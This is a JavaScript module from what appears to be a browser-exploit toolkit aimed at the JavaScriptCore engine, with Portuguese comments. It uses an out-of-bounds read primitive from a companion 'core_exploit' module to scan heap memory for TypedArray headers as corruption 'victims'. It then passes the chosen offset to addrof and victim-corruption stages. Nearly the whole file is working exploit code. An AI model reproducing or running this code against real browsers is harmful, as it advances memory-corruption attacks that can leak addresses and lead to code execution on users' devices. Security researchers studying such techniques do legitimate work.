// js/victim_finder.mjs
import { AdvancedInt64 } from './int64.mjs';
import { log, PAUSE_LAB, toHexS1 } from './utils.mjs';
import * as Core from './core_exploit.mjs';
import { JSC_OFFSETS, OOB_CONFIG } from './config.mjs';

const FNAME_BASE = "VictimFinder";

// Mapeamento de exemplo para m_mode (JSC specific - precisa ser verificado para o alvo exato)
// Estes são valores comuns, mas podem variar.
const TYPED_ARRAY_MODES = {
    0x00: "Int8Array",
    0x01: "Int16Array",
    0x02: "Int32Array",
    0x03: "Uint8Array", // Ou Uint8ClampedArray, às vezes compartilham/são próximos
    0x04: "Uint8ClampedArray",
    0x05: "Uint16Array",
    0x06: "Uint32Array",
    0x07: "Float32Array",
    0x08: "Float64Array",
    0x09: "DataView", // DataView também é um JSArrayBufferView
    // Outros como BigInt64Array, BigUint64Array podem ter outros valores
    // No seu log, 0x06 foi Uint32Array (victim_object)
};


/**
 * Escaneia a memória usando a primitiva OOB em busca de estruturas que se assemelham a TypedArrays.
 * @param {number} scanStartRelativeOffset - Offset relativo ao início da região OOB para começar a varredura.
 * Normalmente Core.getInitialBufferSize().
 * @param {number} scanRangeBytes - Quantos bytes escanear a partir do scanStartRelativeOffset.
 * @param {number} stepBytes - Granularidade da varredura (ex: 4 ou 8 bytes).
 * @returns {Promise<Array<object>>} Uma lista de candidatos promissores.
 */
export async function scanMemoryForTypedArrayCandidates(scanStartRelativeOffset, scanRangeBytes, stepBytes = 8) {
    const FNAME_SCAN = `${FNAME_BASE}.scanMemory`;
    log(`--- Iniciando ${FNAME_SCAN} ---`, 'test', FNAME_SCAN);
    log(`   Configurações da varredura: Início Relativo=${toHexS1(scanStartRelativeOffset)}, Range=${scanRangeBytes} bytes, Passo=${stepBytes} bytes`, 'info', FNAME_SCAN);

    if (!Core.oob_array_buffer_real || !Core.oob_dataview_real) {
        log("   Tentando ativar primitiva OOB primeiro...", 'warn', FNAME_SCAN);
        await Core.triggerOOB_primitive();
        if (!Core.oob_array_buffer_real) {
            log("   ERRO: Primitiva OOB não pôde ser ativada. Varredura abortada.", 'error', FNAME_SCAN);
            return [];
        }
    }

    const candidates = [];
    const maxRelativeOffset = scanStartRelativeOffset + scanRangeBytes;

    // Sanity check para evitar ler muito além do buffer OOB real subjacente
    // O offset máximo para oob_read_relative deve ser menor que o tamanho da "janela OOB"
    // A "janela OOB" é OOB_CONFIG.ALLOCATION_SIZE
    // E o offset relativo é relativo ao início dessa janela (após INITIAL_BUFFER_SIZE do DataView base)
    // Na verdade, oob_read_relative lida com os limites do oob_array_buffer_real total.
    // Um offset relativo X para oob_read_relative significa:
    // dv_offset = X - OOB_CONFIG.INITIAL_BUFFER_SIZE
    // absoluteReadOffset = OOB_CONFIG.BASE_OFFSET_IN_DV + dv_offset
    // Esta checagem precisa ser cuidadosa. O limite seguro é o tamanho do oob_array_buffer_real.
    const effectiveOOBWindowEnd = OOB_CONFIG.ALLOCATION_SIZE; // O tamanho da janela que o dataview cobre.
                                                           // A leitura pode ir antes ou depois, mas dentro do oob_array_buffer_real.
    const safeReadLimit = (Core.oob_array_buffer_real.byteLength - OOB_CONFIG.BASE_OFFSET_IN_DV) + OOB_CONFIG.INITIAL_BUFFER_SIZE - JSC_OFFSETS.TypedArray.ASSOCIATED_ARRAYBUFFER_OFFSET - 8; // Garante que não lemos o último campo + alguns bytes fora do buffer principal.


    log(`   Limite efetivo da janela OOB para scan (relativo): ${toHexS1(effectiveOOBWindowEnd)}`, 'info', FNAME_SCAN);
    log(`   Limite seguro de leitura (relativo ao início do OOB view) para campos do TypedArray: ${toHexS1(safeReadLimit)}`, 'info', FNAME_SCAN);


    for (let currentRelBase = scanStartRelativeOffset; currentRelBase < maxRelativeOffset; currentRelBase += stepBytes) {
        if (currentRelBase > safeReadLimit) {
            log(`   AVISO: currentRelBase ${toHexS1(currentRelBase)} excedeu safeReadLimit ${toHexS1(safeReadLimit)}. Parando varredura para evitar erros de leitura fora do buffer real.`, 'warn', FNAME_SCAN);
            break;
        }

        if (document.hidden) { log("Varredura abortada, página não visível.", "warn", FNAME_SCAN); break; }
        await PAUSE_LAB(5); // Pequena pausa para não travar o browser em varreduras longas

        try {
            const potentialVictimBase = currentRelBase; // Este é o offset relativo para o início do suposto JSObject TypedArray

            // Ler m_mode (1 byte)
            const modeReadOffset = potentialVictimBase + JSC_OFFSETS.TypedArray.M_MODE_OFFSET;
            const m_mode_val = Core.oob_read_relative(modeReadOffset, 1);

            // Ler m_length (4 bytes, número de elementos)
            const lengthReadOffset = potentialVictimBase + JSC_OFFSETS.TypedArray.M_LENGTH_OFFSET;
            const m_length_val = Core.oob_read_relative(lengthReadOffset, 4);

            // Ler m_vector (8 bytes, ponteiro)
            const vectorReadOffset = potentialVictimBase + JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET;
            const m_vector_ptr = Core.oob_read_relative(vectorReadOffset, 8); // Retorna AdvancedInt64

            // Validar heuristicamente
            // 1. m_mode é um tipo conhecido?
            const typeName = TYPED_ARRAY_MODES[m_mode_val] || "Desconhecido/Inválido";
            
            // 2. m_length é razoável? (e.g., > 0 e não absurdamente grande)
            const isLengthPlausible = m_length_val > 0 && m_length_val < (1024 * 1024 * 8); // Ex: até 8M elementos

            // 3. m_vector_ptr é razoável? (não nulo, não -1)
            const isVectorPlausible = m_vector_ptr && !m_vector_ptr.isNullPtr() && !m_vector_ptr.isNegativeOne();

            if (isLengthPlausible && isVectorPlausible && TYPED_ARRAY_MODES[m_mode_val] !== undefined) {
                const candidate = {
                    gapOrRelativeOffset: potentialVictimBase, // Este é o "GAP" se o OOB buffer está logo antes
                    m_mode: m_mode_val,
                    typeName: typeName,
                    m_length: m_length_val,
                    m_vector_hex: m_vector_ptr.toString(true),
                    raw_m_vector: m_vector_ptr // Guarda o Int64
                };
                candidates.push(candidate);
                log(`   CANDIDATO ENCONTRADO: GAP/OffsetRel: ${toHexS1(candidate.gapOrRelativeOffset)}, Tipo: ${typeName} (${toHexS1(m_mode_val,8)}), Comprimento: ${m_length_val} (${toHexS1(m_length_val)}), Vetor: ${candidate.m_vector_hex}`, 'leak', FNAME_SCAN);
            }

        } catch (e) {
            // Erros de leitura são esperados ao escanear memória aleatória.
            // log(`   Erro ao ler em offset relativo base ${toHexS1(currentRelBase)}: ${e.message}`, 'info', FNAME_SCAN);
            if (e.message.includes("fora dos limites do buffer real")) {
                 log(`   Atingido limite do buffer real em ${toHexS1(currentRelBase)}. Parando varredura.`, 'warn', FNAME_SCAN);
                 break; // Parar se o erro for leitura fora do buffer principal
            }
        }
    }

    if (candidates.length > 0) {
        log(`   Varredura concluída. ${candidates.length} candidatos promissores encontrados.`, 'good', FNAME_SCAN);
    } else {
        log(`   Varredura concluída. Nenhum candidato promissor encontrado com os critérios atuais.`, 'warn', FNAME_SCAN);
    }
    log(`--- ${FNAME_SCAN} Concluído ---`, 'test', FNAME_SCAN);
    return candidates;
}

// Função para ser chamada pela UI
export async function findVictimButtonHandler() {
    const FNAME_HANDLER = `${FNAME_BASE}.Handler`;
    const scanRangeEl = document.getElementById('victimFinderScanRange');
    const scanStepEl = document.getElementById('victimFinderScanStep');
    const scanStartOffsetEl = document.getElementById('victimFinderScanStartOffset');


    const scanRange = scanRangeEl ? parseInt(scanRangeEl.value, 10) : 2048; // Default 2KB
    const scanStep = scanStepEl ? parseInt(scanStepEl.value, 10) : 8;     // Default 8 bytes
    let scanStartOffset = scanStartOffsetEl ? parseInt(scanStartOffsetEl.value, 10) : null;

    if (scanStartOffset === null || isNaN(scanStartOffset)) {
        // Por padrão, começa a escanear logo após o "initial buffer" da perspectiva do oob_dataview_real
        // Isso significa o início da região que é considerada OOB.
        scanStartOffset = Core.getInitialBufferSize(); 
        log(`   Offset inicial de varredura não especificado ou inválido. Usando padrão: ${toHexS1(scanStartOffset)} (Core.getInitialBufferSize())`, "info", FNAME_HANDLER);
        if(scanStartOffsetEl) scanStartOffsetEl.value = scanStartOffset; // Atualiza UI
    }


    if (isNaN(scanRange) || scanRange <=0) {
        log("Range de varredura inválido.", "error", FNAME_HANDLER);
        return;
    }
    if (isNaN(scanStep) || scanStep <=0) {
        log("Passo de varredura inválido.", "error", FNAME_HANDLER);
        return;
    }

    const candidates = await scanMemoryForTypedArrayCandidates(scanStartOffset, scanRange, scanStep);

    if (candidates.length > 0) {
        log("Candidatos Encontrados (GAP/Offset é relativo ao início da janela OOB do core_exploit):", "analysis", FNAME_HANDLER);
        candidates.forEach(c => {
            log(`  - GAP/Offset: ${toHexS1(c.gapOrRelativeOffset)} | Tipo: ${c.typeName} (${toHexS1(c.m_mode,8)}) | Len: ${c.m_length} | Vec: ${c.m_vector_hex}`, "analysis", FNAME_HANDLER);
        });
        // Opcional: tentar popular o campo de GAP do VictimCorruptor ou PostExploit com o primeiro candidato?
        const gapInputEl = document.getElementById('gap_to_test_input'); // Assumindo que existe um input com este ID
        if (gapInputEl && candidates[0]) {
            gapInputEl.value = candidates[0].gapOrRelativeOffset;
            log(`   GAP/Offset do primeiro candidato (${toHexS1(candidates[0].gapOrRelativeOffset)}) populado no input 'gap_to_test_input'.`, "info", FNAME_HANDLER);
        }
         const addrofGapEl = document.getElementById('addrofGap');
         if (addrofGapEl && candidates[0]) {
            addrofGapEl.value = candidates[0].gapOrRelativeOffset;
            log(`   GAP/Offset do primeiro candidato (${toHexS1(candidates[0].gapOrRelativeOffset)}) populado no input 'addrofGap'.`, "info", FNAME_HANDLER);
         }

    } else {
        log("Nenhum candidato a TypedArray encontrado na varredura.", "warn", FNAME_HANDLER);
    }
}
